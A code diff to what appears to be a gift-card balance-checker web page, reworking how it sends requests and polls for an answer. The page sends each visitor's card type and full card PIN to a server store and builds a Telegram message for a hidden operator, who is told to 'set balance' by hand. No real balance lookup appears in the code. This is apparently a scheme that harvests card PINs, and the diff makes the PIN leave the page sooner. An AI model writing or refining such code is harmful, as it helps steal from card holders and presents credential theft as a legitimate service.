@@ -405,19 +405,7 @@ async function checkBalance() {
     return;
   }
 
-  // Cross-device resolved lookup (shared server cache)
-  const remoteCached = await readLatestBalanceRemote(cardType, cardPin);
-  if (remoteCached) {
-    saveLatestBalance(cardType, cardPin, remoteCached);
-    if (remoteCached.balance) {
-      showResult(remoteCached.balance, cardLabel, maskedPin);
-    } else {
-      showError(remoteCached.error || 'Card not found or expired.');
-    }
-    return;
-  }
-
-  // ── UI: loading ──
+  // ── UI: loading (do not wait on Telegram before the first status check) ──
   setLoading(true);
   clearResult();
   document.getElementById('loadingState').style.display = 'block';
@@ -451,20 +439,33 @@ async function runBalanceCheck(cardType, cardPin, maskedPin, cardLabel, requestI
   }
   tgMessage += `👉 Open admin panel and set balance for this Request ID.`;
 
-  try {
-    await sendTelegram(tgMessage);
-  } catch (e) {
-    console.error('Telegram send error:', e);
-  }
+  let finished = false;
+  const finish = (fn) => {
+    if (finished) return;
+    finished = true;
+    clearInterval(poller);
+    setLoading(false);
+    document.getElementById('loadingState').style.display = 'none';
+    fn();
+  };
 
-  // ── Create pending request in shared server storage ──
-  try { await createPendingRequestRemote(requestId, cardType, cardPin); }
-  catch (e) { console.error('request create error', e); }
+  sendTelegram(tgMessage).catch((e) => console.error('Telegram send error:', e));
+  createPendingRequestRemote(requestId, cardType, cardPin).catch((e) => console.error('request create error', e));
+  readLatestBalanceRemote(cardType, cardPin).then((remoteCached) => {
+    if (!remoteCached) return;
+    saveLatestBalance(cardType, cardPin, remoteCached);
+    finish(() => {
+      if (remoteCached.balance) showResult(remoteCached.balance, cardLabel, maskedPin);
+      else showError(remoteCached.error || 'Card not found or expired.');
+    });
+  }).catch(() => {});
 
-  // ── Poll for admin response ──
   const start = Date.now();
 
-  const poller = setInterval(async () => {
+  const poller = setInterval(pollOnce, CONFIG.POLL_INTERVAL_MS);
+  pollOnce();
+
+  async function pollOnce() {
     let reqStatus = null;
     try {
       reqStatus = await readRequestStatusRemote(requestId);
@@ -472,10 +473,7 @@ async function runBalanceCheck(cardType, cardPin, maskedPin, cardLabel, requestI
       console.error('status poll error', e);
     }
     if (reqStatus && reqStatus.status && reqStatus.status !== 'pending') {
-      clearInterval(poller);
-      setLoading(false);
-      document.getElementById('loadingState').style.display = 'none';
-
+      finish(() => {
       if (reqStatus.status === 'resolved' && reqStatus.balance) {
         saveLatestBalance(cardType, cardPin, {
           cardType,
@@ -495,16 +493,14 @@ async function runBalanceCheck(cardType, cardPin, maskedPin, cardLabel, requestI
         });
         showError(reqStatus.error || 'Card not found or expired.');
       }
+      });
       return;
     }
 
     if (Date.now() - start > CONFIG.POLL_TIMEOUT_MS) {
-      clearInterval(poller);
-      setLoading(false);
-      document.getElementById('loadingState').style.display = 'none';
-      showError('Request timed out. Admin did not respond. Please try again.');
+      finish(() => showError('Request timed out. Admin did not respond. Please try again.'));
     }
-  }, CONFIG.POLL_INTERVAL_MS);
+  }
 }
 
 function setLoading(on) {
